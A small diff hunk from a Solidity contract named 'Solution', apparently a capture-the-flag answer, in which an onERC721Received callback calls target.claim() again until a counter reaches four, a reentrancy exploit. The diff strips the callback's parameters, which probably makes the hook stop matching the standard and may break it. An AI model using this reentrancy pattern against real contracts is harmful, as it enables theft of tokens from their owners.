@@ -17,7 +17,7 @@ contract Solution  {
         target.claim();
     }
  
-    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) public returns (bytes4) {
+    function onERC721Received() public returns (bytes4) {
         while (count < 4) {
             count++;
             target.claim();
